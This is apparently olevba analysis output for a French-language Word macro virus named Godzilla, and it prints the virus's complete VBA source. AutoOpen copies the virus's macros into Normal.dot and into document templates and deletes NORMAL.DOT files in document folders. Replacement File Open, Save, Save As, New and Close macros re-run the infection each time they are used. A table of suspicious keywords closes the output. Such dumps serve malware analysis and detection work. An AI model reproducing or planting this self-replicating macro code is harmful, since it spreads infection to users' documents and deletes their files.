olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Godzilla.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FichierOuvrir.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/FichierOuvrir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Ouvre un document ou un modèle existant"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FichierOuvrir.MAIN"
On Error GoTo -1: On Error GoTo Fin
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
WordBasic.Call "AutoOpen"
Fin:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim ReadOnly
Dim ExécSeul
Dim stat As Object
Dim Fichier$
Dim CheminFichier$
Dim Modèle$
Dim CheminModèle$
Dim NomModèle$
Dim ModèleExec$
Dim CheminModèleExec$
Dim NomModèleExec$
Dim Etat
Dim ModèleAttaché$
Dim i

' Rendre le virus un peu plus pénible
ReadOnly = 0
ExécSeul = 0

WordBasic.DisableAutoMacros
'On Error Goto Fin
If WordBasic.IsMacro() <> -1 Then
    Set stat = WordBasic.DialogRecord.DocumentStatistics(False)
    WordBasic.CurValues.DocumentStatistics stat

    Fichier$ = UCase(stat.FileName)
    CheminFichier$ = UCase(stat.Directory) + "\"

    Modèle$ = UCase(stat.Template)
    CheminModèle$ = UCase(WordBasic.[FileNameInfo$](Modèle$, 5))
    NomModèle$ = UCase(WordBasic.[FileNameInfo$](Modèle$, 3))

    ModèleExec$ = UCase(WordBasic.[MacroFileName$]())
    CheminModèleExec$ = UCase(WordBasic.[FileNameInfo$](ModèleExec$, 5))
    NomModèleExec$ = UCase(WordBasic.[FileNameInfo$](ModèleExec$, 3))

' Sauvegarde des macros dans le fichier modèle si le modèle actif et dans Normal.dot

    If NomModèleExec$ <> "NORMAL.DOT" Then
        WordBasic.MacroCopy ModèleExec$ + ":AutoOpen", "Global:AutoOpen", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":AutoExec", "Global:AutoExec", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierEnregistrer", "Global:FichierEnregistrer", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierEnregistrerSous", "Global:FichierEnregistrerSous", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierEnregistrerTout", "Global:FichierEnregistrerTout", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierFermer", "Global:FichierFermer", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierOuvrir", "Global:FichierOuvrir", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierNouveau", "Global:FichierNouveau", ExécSeul
    End If

    If (Modèle$ <> ModèleExec$) And (NomModèle$ <> "NORMAL.DOT") Then

        WordBasic.FileTemplates Store:=0, Template:="", LinkStyles:=0
        Etat = GetAttr(Modèle$)
        SetAttr Modèle$, 0
        WordBasic.FileTemplates Store:=0, Template:=Modèle$, LinkStyles:=0

        WordBasic.MacroCopy ModèleExec$ + ":AutoOpen", Modèle$ + ":AutoOpen", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":AutoExec", Modèle$ + ":AutoExec", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierEnregistrer", Modèle$ + ":FichierEnregistrer", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierEnregistrerSous", Modèle$ + ":FichierEnregistrerSous", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierEnregistrerTout", Modèle$ + ":FichierEnregistrerTout", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierFermer", Modèle$ + ":FichierFermer", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierOuvrir", Modèle$ + ":FichierOuvrir", ExécSeul
        WordBasic.MacroCopy ModèleExec$ + ":FichierNouveau", Modèle$ + ":FichierNouveau", ExécSeul
        WordBasic.SaveTemplate
        WordBasic.FileTemplates Store:=0, Template:="", LinkStyles:=0
        SetAttr Modèle$, Etat
        WordBasic.FileTemplates Store:=0, Template:=Modèle$, LinkStyles:=0
    End If

' Attache le modèle automatiquement dans le même répertoire que le fichier s'il existe

    If CheminFichier$ <> "\" Then

        ' Tue le normal.dot éventuel
        If CheminFichier$ <> CheminModèle$ Then
            WordBasic.Kill CheminFichier$ + "NORMAL.DOT"
        End If

        ' Normal.dot est un nom qui ne peut pas être utilisé
        If NomModèle$ = "NORMAL.DOT" Then
            ModèleAttaché$ = CheminFichier$ + WordBasic.[FileNameInfo$](Fichier$, 4) + ".DOT"
        Else
            ModèleAttaché$ = CheminFichier$ + NomModèle$
        End If

        ' Attache le modèle au fichier
        If Modèle$ <> ModèleAttaché$ Then

            WordBasic.FileFind SearchPath:=WordBasic.[FileNameInfo$](ModèleAttaché$, 5), Name:=WordBasic.[FileNameInfo$](ModèleAttaché$, 3)
            If WordBasic.CountFoundFiles() = 0 Then
                WordBasic.CopyFile FileName:=Modèle$, Directory:=ModèleAttaché$
            End If

            SetAttr ModèleAttaché$, 0
            WordBasic.FileTemplates Store:=0, Template:=ModèleAttaché$, LinkStyles:=0

            If NomModèle$ <> "NORMAL.DOT" Then
                WordBasic.AddAddIn Modèle$, 1
            End If

            If NomModèle$ <> "NORMAL.DOT" Then
                For i = 1 To WordBasic.CountMacros(1, 0, 0)
                    WordBasic.MacroCopy Modèle$ + ":" + WordBasic.[MacroName$](i, 1, 0, 0), ModèleAttaché$ + ":" + WordBasic.[MacroName$](i, 1, 0, 0), ExécSeul
                Next i
            Else
                For i = 1 To WordBasic.CountMacros(0, 0, 0)
                    WordBasic.MacroCopy Modèle$ + ":" + WordBasic.[MacroName$](i, 0, 0, 0), ModèleAttaché$ + ":" + WordBasic.[MacroName$](i, 0, 0, 0), ExécSeul
                Next i
            End If

            WordBasic.SaveTemplate
    
            If NomModèle$ <> "NORMAL.DOT" Then
                WordBasic.DeleteAddIn Modèle$
            End If
        
            WordBasic.FileTemplates Store:=0, Template:="", LinkStyles:=0
            SetAttr ModèleAttaché$, 34 + ReadOnly
            WordBasic.FileTemplates Store:=0, Template:=ModèleAttaché$, LinkStyles:=0
            WordBasic.FileSave
        End If
    End If

End If
Fin:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    WordBasic.MsgBox "Godzilla Macro Virus", "", -8
End Sub
-------------------------------------------------------------------------------
VBA MACRO FichierEnregistrer.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/FichierEnregistrer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo Fin
WordBasic.FileSave
WordBasic.Call "AutoOpen"
Fin:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FichierEnregistrerSous.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/FichierEnregistrerSous'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Enregistre le document actif sous un nouveau nom"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FichierEnregistrerSous.MAIN"
On Error GoTo -1: On Error GoTo Fin
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
WordBasic.Call "AutoOpen"
Fin:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FichierEnregistrerTout.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/FichierEnregistrerTout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Enregistre tous les fichiers, macros et insertions automatiques ouverts, en invitant à chaque fois l'utilisateur à les enregistrer"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FichierEnregistrerTout.MAIN"
On Error GoTo -1: On Error GoTo Fin
WordBasic.FileSaveAll
Fin:
Err.Number = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FichierFermer.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/FichierFermer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Ferme toutes les fenêtres du document actif"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FichierFermer.MAIN"
On Error GoTo -1: On Error GoTo Fin:
WordBasic.FileClose
WordBasic.Call "AutoExec"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FichierNouveau.bas 
in file: Virus.MSWord.Godzilla.a - OLE stream: 'Macros/VBA/FichierNouveau'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Crée un nouveau document ou un nouveau modèle"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FichierNouveau.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
On Error GoTo -1: On Error GoTo Fin
WordBasic.CurValues.FileNew dlg
WordBasic.Dialog.FileNew dlg
WordBasic.FileNew dlg
WordBasic.Call "AutoOpen"
Fin:
Err.Number = 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

